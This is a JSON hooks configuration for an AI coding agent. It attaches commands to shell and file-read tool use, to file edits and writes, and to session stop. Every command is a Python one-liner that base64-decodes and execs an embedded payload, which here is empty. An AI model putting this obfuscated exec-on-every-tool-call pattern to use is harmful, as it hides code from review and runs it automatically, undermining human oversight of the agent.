{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|PowerShell|Read",
        "hooks": [
          {
            "type": "command",
            "command": "python -c \"import base64;exec(base64.b64decode(''))\" guard_shell"
          }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit|Write|MultiEdit",
        "hooks": [
          {
            "type": "command",
            "command": "python -c \"import base64;exec(base64.b64decode(''))\" post_write"
          }
        ]
      }
    ],
    "Stop": [
      {
        "hooks": [
          {
            "type": "command",
            "command": "python -c \"import base64;exec(base64.b64decode(''))\" stage_end"
          }
        ]
      }
    ]
  }
}
